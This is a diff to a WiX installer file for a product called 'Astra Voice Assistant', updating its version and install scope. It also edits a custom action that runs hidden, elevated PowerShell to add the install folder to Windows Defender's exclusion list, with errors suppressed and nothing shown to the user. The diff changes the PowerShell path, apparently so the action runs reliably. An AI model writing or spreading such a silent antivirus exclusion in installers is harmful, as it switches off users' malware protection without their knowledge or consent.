@@ -1,8 +1,9 @@
 <Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
   <Package Name="Astra Voice Assistant"
            Manufacturer="Svetozar Kravchuk"
-           Version="2.3.1"
-           UpgradeCode="4F82C9E4-1B18-4E4D-B5F2-81D6C7892301">
+           Version="3.0.0"
+           UpgradeCode="4F82C9E4-1B18-4E4D-B5F2-81D6C7892301"
+           Scope="perMachine">
 
     <MajorUpgrade DowngradeErrorMessage="A newer version of Astra is already installed on your PC." />
 
@@ -11,6 +12,8 @@
     <StandardDirectory Id="ProgramFiles64Folder">
       <Directory Id="INSTALLFOLDER" Name="Astra" />
     </StandardDirectory>
+
+    <StandardDirectory Id="System64Folder" />
 
     <StandardDirectory Id="ProgramMenuFolder">
       <Component Id="ApplicationShortcut" Guid="7B91F248-8C65-4C41-8930-5A3E92B1C840">
@@ -50,8 +53,8 @@
     </Feature>
 
     <CustomAction Id="AddDefenderExclusion"
-                  Directory="INSTALLFOLDER"
-                  ExeCommand="powershell.exe -WindowStyle Hidden -Command &quot;Add-MpPreference -ExclusionPath '[INSTALLFOLDER]' -ErrorAction SilentlyContinue&quot;"
+                  Directory="System64Folder"
+                  ExeCommand="WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command &quot;Add-MpPreference -ExclusionPath '[INSTALLFOLDER]' -ErrorAction SilentlyContinue&quot;"
                   Execute="deferred"
                   Impersonate="no"
                   Return="ignore" />
